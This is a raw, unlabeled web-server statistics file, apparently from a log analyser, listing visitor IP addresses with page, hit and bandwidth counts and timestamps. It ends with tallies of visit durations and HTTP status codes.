5	0	0	1	0	0	24780781	0	0	24780781	0	0	138.197.69.159
5	1	0	0	0	25950940	0	0	25950940	0	0	24	54.36.148.101
5	0	0	1	0	0	25130656	0	0	25130656	0	0	104.236.94.22
5	0	0	1	0	0	25823565	0	0	25823565	0	0	159.203.67.249
5	0	0	1	0	0	24705036	0	0	24705036	0	0	138.197.37.233
5	0	0	1	0	0	24914965	0	0	24914965	0	0	45.55.208.145
5	72	1	2	0	25393554	25393552	0	25393552	25393552	0	969850	41.90.201.49
5	0	0	1	0	0	25215582	0	0	25215582	0	0	45.55.133.173
5	0	0	1	0	0	25474181	0	0	25474181	0	0	104.236.218.15
5	124	2	1	18	25412744	25412585	25412744	25412585	25412585	25412627	3865258	197.237.84.44
5	0	0	1	0	0	24838787	0	0	24838787	0	0	138.197.90.6
5	67	1	2	0	25337887	25337886	0	25337886	25337885	0	790680	105.58.55.33
5	0	0	1	0	0	25695453	0	0	25695453	0	0	165.227.69.14
5	404	4	51	17	25723569	25723569	25779459	25714754	25714754	25714830	10772167	196.207.164.32
5	0	0	1	0	0	25345113	0	0	25345113	0	0	159.65.191.198
5	0	0	1	0	0	24756164	0	0	24756164	0	0	138.197.16.200
5	0	0	1	0	0	24888986	0	0	24888986	0	0	104.236.65.218
5	0	0	1	0	0	24791649	0	0	24791649	0	0	138.197.13.156
5	0	0	1	0	0	25950940	0	0	25950940	0	0	54.36.148.55
5	0	0	1	0	0	24826595	0	0	24826595	0	0	174.138.84.82
5	0	0	1	0	0	25954470	0	0	25954470	0	0	45.55.35.173
5	0	0	1	0	0	25345071	0	0	25345071	0	0	159.89.44.58
5	0	0	1	0	0	24756181	0	0	24756181	0	0	138.197.81.12
5	0	0	1	0	0	25918832	0	0	25918832	0	0	54.36.150.84
5	0	0	1	0	0	25742322	0	0	25742322	0	0	142.93.184.20
5	30	0	1	0	25273007	25273007	0	25273007	25273007	0	270846	197.232.61.252
5	0	0	1	0	0	25864051	0	0	25864051	0	0	68.183.151.106
5	0	0	1	0	0	25950754	0	0	25950754	0	0	54.36.148.35
5	0	0	1	0	0	25747235	0	0	25747235	0	0	209.17.96.66
5	0	0	1	0	0	25936519	0	0	25936519	0	0	54.36.150.77
5	1	0	0	0	25946582	0	0	25946582	0	0	4546	54.36.149.6
5	76	2	6	3	25903608	25903608	25903606	25903428	25903428	25903606	870661	197.237.171.16
5	0	0	1	0	0	25215585	0	0	25215585	0	0	104.236.249.49
5	1	0	0	0	25926273	0	0	25926273	0	0	24	54.36.150.155
5	0	0	1	0	0	25864812	0	0	25864812	0	0	174.138.62.199
5	42	0	8	2	25822570	25822570	25822569	25822568	25822568	25822569	546682	196.105.102.127
5	0	0	1	0	0	24914993	0	0	24914993	0	0	45.55.248.206
5	0	0	1	0	0	24756819	0	0	24756819	0	0	138.197.85.156
5	1	0	0	0	25972163	0	0	25972163	0	0	24	54.36.149.67
5	1	0	0	0	25946582	0	0	25946582	0	0	24	54.36.149.63
5	0	0	1	0	0	25907664	0	0	25907664	0	0	165.227.177.173
5	0	0	1	0	0	24825785	0	0	24825785	0	0	174.138.88.8
5	69	1	2	0	25104418	25104417	0	25104417	25104417	0	877624	154.122.50.119
5	0	0	1	0	0	25936305	0	0	25936305	0	0	54.36.149.58
5	0	0	1	0	0	25778166	0	0	25778166	0	0	209.17.97.90
5	0	0	1	0	0	25388326	0	0	25388326	0	0	104.236.16.48
5	0	0	1	0	0	25477288	0	0	25477288	0	0	185.35.63.65
5	0	0	1	0	0	25754776	0	0	25754776	0	0	209.17.97.82
5	0	0	1	0	0	25260061	0	0	25260061	0	0	104.236.97.73
5	0	0	1	0	0	24781927	0	0	24781927	0	0	45.55.81.185
5	1131	22	33	2	25562514	25562514	25412447	25391151	25391151	25412447	16262997	197.232.22.220
5	0	0	1	0	0	24954824	0	0	24954824	0	0	104.236.81.212
5	0	0	1	0	0	24954803	0	0	24954803	0	0	45.55.131.166
5	45	3	1	0	25401204	25401127	0	25401127	25401127	0	930484	41.81.7.233
5	72	1	1	0	25481863	25481862	0	25481861	25481862	0	800348	185.128.27.102
5	8	0	0	0	25482810	0	0	25482809	0	0	33182	185.128.27.101
5	0	0	1	0	0	25757493	0	0	25757493	0	0	209.17.97.122
5	0	0	1	0	0	25130586	0	0	25130586	0	0	104.236.200.51
5	0	0	1	0	0	24691816	0	0	24691816	0	0	138.197.46.35
5	0	0	1	0	0	25823535	0	0	25823535	0	0	68.183.52.112
5	0	0	1	0	0	25084508	0	0	25084508	0	0	138.197.90.16
5	0	0	1	0	0	25938689	0	0	25938689	0	0	54.36.149.30
5	1	0	0	0	25938689	0	0	25938689	0	0	24	54.36.150.30
5	0	0	1	0	0	24692752	0	0	24692752	0	0	138.197.46.31
5	65	1	2	0	25384911	25384911	0	25384910	25384910	0	784119	41.185.17.106
5	0	0	1	0	0	25485018	0	0	25485018	0	0	185.35.63.210
5	0	0	1	0	0	25879143	0	0	25879143	0	0	209.17.97.114
5	0	0	2	0	0	25906587	0	0	25888182	0	0	209.17.97.58
5	71	1	2	0	25656954	25656952	0	25656952	25656952	0	944403	41.90.49.237
5	0	0	1	0	0	25179449	0	0	25179449	0	0	174.138.56.201
5	0	0	1	0	0	25946270	0	0	25946270	0	0	54.36.149.104
5	0	0	1	0	0	25043611	0	0	25043611	0	0	174.138.77.214
5	0	0	1	0	0	25858548	0	0	25858548	0	0	212.83.146.233
5	0	0	1	0	0	25909265	0	0	25909265	0	0	209.17.97.106
5	41	2	3	0	25482841	25482841	0	25482817	25482817	0	895912	185.161.201.10
5	0	0	1	0	0	25179376	0	0	25179376	0	0	165.227.115.93
5	0	0	1	0	0	24740699	0	0	24740699	0	0	138.197.3.98
5	0	0	1	0	0	25501348	0	0	25501348	0	0	185.35.63.27
5	0	0	1	0	0	25299991	0	0	25299991	0	0	138.197.65.195
5	0	0	1	0	0	24756774	0	0	24756774	0	0	138.197.5.174
5	0	0	1	0	0	25742337	0	0	25742337	0	0	159.65.179.188
5	0	0	1	0	0	24740739	0	0	24740739	0	0	138.197.3.91
5	0	0	1	0	0	24876647	0	0	24876647	0	0	138.197.65.200
5	0	0	1	0	0	25388284	0	0	25388284	0	0	159.203.123.70
5	0	0	1	0	0	24693089	0	0	24693089	0	0	138.197.46.10
5	466	11	20	0	25325926	25325925	0	25157335	25157446	0	6511450	154.70.14.145
5	0	0	1	0	0	25609594	0	0	25609594	0	0	159.65.41.44
5	0	0	1	0	0	25520433	0	0	25520433	0	0	159.65.255.150
5	0	0	1	0	0	24704377	0	0	24704377	0	0	45.55.77.109
5	0	0	1	0	0	24704518	0	0	24704518	0	0	138.197.35.172
5	0	0	2	0	0	25884782	0	0	25880860	0	0	209.17.97.26
5	0	0	1	0	0	25568309	0	0	25568309	0	0	142.93.78.86
5	0	0	1	0	0	25751599	0	0	25751599	0	0	51.15.191.81
5	0	0	1	0	0	25954490	0	0	25954490	0	0	142.93.187.57
5	68	1	2	0	25195080	25195063	0	25195063	25195063	0	810771	105.62.35.36
5	0	0	0	1	0	0	25778836	0	0	25778836	0	209.17.97.18
5	0	0	1	0	0	25299980	0	0	25299980	0	0	159.89.185.246
5	0	0	1	0	0	25216213	0	0	25216213	0	0	138.197.72.236
5	0	0	1	0	0	25474947	0	0	25474947	0	0	185.35.63.154
5	1565	25	59	21	25836831	25836829	25778050	25069575	25069575	25412588	26307051	197.248.207.206
5	0	0	0	1	0	0	25781505	0	0	25781505	0	138.197.77.54
5	69	1	3	5	25631073	25631072	25630466	25631067	25631067	25630064	902735	41.80.128.121
5	0	0	1	0	0	25744628	0	0	25744628	0	0	209.17.97.10
5	0	0	1	0	0	25972163	0	0	25972163	0	0	54.36.148.246
5	0	0	2	0	0	25878025	0	0	25873690	0	0	209.17.96.250
5	0	0	1	0	0	24780896	0	0	24780896	0	0	138.197.33.23
5	0	0	1	0	0	25927899	0	0	25927899	0	0	54.36.148.243
5	1	0	1	0	25095973	25095972	0	25095973	25095972	0	6762	41.80.130.232
5	0	0	1	0	0	24914079	0	0	24914079	0	0	104.236.91.236
5	0	0	1	0	0	24932190	0	0	24932190	0	0	45.55.243.133
5	0	0	1	0	0	25742805	0	0	25742805	0	0	209.17.96.242
5	64	1	2	0	25141409	25141409	0	25141409	25141409	0	667799	196.106.228.226
5	0	0	1	0	0	25961527	0	0	25961527	0	0	54.36.148.228
5	0	0	1	0	0	25907660	0	0	25907660	0	0	134.209.39.112
5	1	0	2	8	25910896	25910896	25910896	25910896	25910896	25910896	26552	37.59.55.45
5	0	0	3	0	0	25914328	0	0	25875419	0	0	209.17.96.234
5	0	0	1	0	0	25858523	0	0	25858523	0	0	62.4.14.198
5	0	0	1	0	0	25751469	0	0	25751469	0	0	62.4.14.206
5	0	0	1	0	0	24933451	0	0	24933451	0	0	174.138.51.63
5	0	0	1	0	0	24933439	0	0	24933439	0	0	174.138.51.161
5	0	0	1	0	0	25260090	0	0	25260090	0	0	45.55.202.205
5	0	0	1	0	0	24838859	0	0	24838859	0	0	174.138.95.88
5	0	0	1	0	0	24877728	0	0	24877728	0	0	104.236.215.238
5	0	0	1	0	0	25495120	0	0	25495120	0	0	185.35.63.123
5	0	0	1	0	0	24932203	0	0	24932203	0	0	138.197.98.161
5	0	0	1	0	0	25895186	0	0	25895186	0	0	209.17.97.2
5	0	0	3	0	0	25894639	0	0	25733741	0	0	209.17.96.218
5	77	1	2	0	25802415	25802412	0	25802411	25802411	0	943343	105.231.6.65
5	0	0	1	0	0	25936305	0	0	25936305	0	0	54.36.148.213
5	67	1	2	0	25161577	25161576	0	25161576	25161576	0	794653	197.183.130.172
5	0	0	1	0	0	25818157	0	0	25818157	0	0	171.67.70.41
5	0	0	1	0	0	25043577	0	0	25043577	0	0	138.197.19.36
5	0	0	1	0	0	25961527	0	0	25961527	0	0	54.36.148.206
5	0	0	1	0	0	25926295	0	0	25926295	0	0	54.36.148.196
5	0	0	1	0	0	25520426	0	0	25520426	0	0	159.65.179.112
5	0	0	1	0	0	25652562	0	0	25652562	0	0	159.65.186.175
5	1	0	1	0	25818081	25818081	0	25818081	25818081	0	4526	171.67.70.35
5	0	0	1	0	0	25927899	0	0	25927899	0	0	54.36.148.191
5	0	0	1	0	0	25763181	0	0	25763181	0	0	209.17.96.194
5	0	0	1	0	0	25652536	0	0	25652536	0	0	165.227.119.248
5	0	0	1	0	0	25433836	0	0	25433836	0	0	104.236.34.43
5	0	0	1	0	0	25609618	0	0	25609618	0	0	159.89.180.226
5	0	0	1	0	0	24994861	0	0	24994861	0	0	104.131.7.18
5	0	0	1	0	0	25389377	0	0	25389377	0	0	104.236.56.48
5	78	1	3	0	25202139	25202139	0	25200924	25200924	0	1077385	41.212.113.247
5	0	0	1	0	0	24791619	0	0	24791619	0	0	138.197.5.79
5	0	0	1	0	0	24826591	0	0	24826591	0	0	159.203.117.38
5	0	0	1	0	0	24888961	0	0	24888961	0	0	104.236.245.192
5	0	0	1	0	0	25946270	0	0	25946270	0	0	54.36.148.169
z	0	286	0	25935109	0
z	2	8	0	25972163	192
z	3	623	0	25935109	312432
z	4	2513	8	25946582	9849399
z	5	1264	48	25935109	50177445
z	6	125	27	25935109	17847161
c	200	4727	25972163
c	301	57	25961527
c	302	303	25972163
c	304	92	25413724
c	404	15	25910896
c	405	12	25910896
c	500	52	25781553
